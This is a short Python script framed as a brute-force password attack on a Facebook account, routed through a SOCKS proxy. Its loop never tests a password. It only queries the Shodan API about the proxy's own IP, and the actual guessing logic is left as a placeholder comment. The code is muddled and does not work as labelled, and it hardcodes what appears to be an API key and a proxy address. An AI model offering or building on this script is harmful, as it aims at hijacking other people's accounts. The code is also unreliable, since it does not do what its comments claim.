import requests
import time
import random
import threading
from requests.auth import HTTPProxyAuth

# Shodan API Key (replace 'YOUR_SHODAN_API_KEY' with your actual API key)
SHODAN_API_KEY = 'XQ6vfJzTek01BYFX1f7WQbK9L0AmSRRZ'

# Shodan proxy details (replace placeholders with actual values)
shodan_proxy_ip = "34.28.27.73"
shodan_proxy_port = "1080"
shodan_proxy_auth = HTTPProxyAuth('your_proxy_username', 'your_proxy_password')  # If your proxy requires authentication

# Function to perform brute force attack
def brute_force(username, fb_id, passwords):
    for password in passwords:
        # Use the requests library with SOCKS proxy
        proxies = {'http': f'socks5://{shodan_proxy_ip}:{shodan_proxy_port}',
                   'https': f'socks5://{shodan_proxy_ip}:{shodan_proxy_port}'}
        
        try:
            result = requests.get(f'https://api.shodan.io/shodan/host/{shodan_proxy_ip}?key={SHODAN_API_KEY}',
                                  proxies=proxies, timeout=10, auth=shodan_proxy_auth)
            # Process Shodan result as needed
            print(result.text)
        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}")
        
        # Rest of your brute-force logic
        # ...

# Function to read passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return file.read().splitlines()

# Function to execute the main brute-force attack
def main():
    username = input("Enter email address (as username): ")
    fb_id = input("Enter Facebook ID: ")
    password_file = input("Enter the password file name: ")

    # Read passwords from file
    passwords = read_passwords(password_file)

    # Perform brute-force attack
    brute_force(username, fb_id, passwords)

if __name__ == '__main__':
    main()

